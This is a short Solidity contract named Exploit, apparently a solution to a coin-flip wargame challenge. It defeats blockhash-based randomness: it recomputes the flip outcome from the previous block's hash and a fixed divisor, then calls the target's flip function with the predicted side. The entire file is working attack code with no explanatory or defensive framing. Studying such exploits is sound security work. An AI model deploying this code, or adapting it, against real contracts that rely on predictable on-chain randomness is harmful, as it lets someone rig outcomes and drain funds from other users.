// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);
    function flip(bool side) external returns (bool);
}

contract Exploit {

    using SafeMath for uint256;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;
    ICoinFlip coin;

    constructor (address coinAddress) public {
        coin = ICoinFlip(coinAddress);
    }
    function fire() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        if (lastHash == blockValue) {
            revert("try sometime else");
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        return coin.flip(side);
    }
}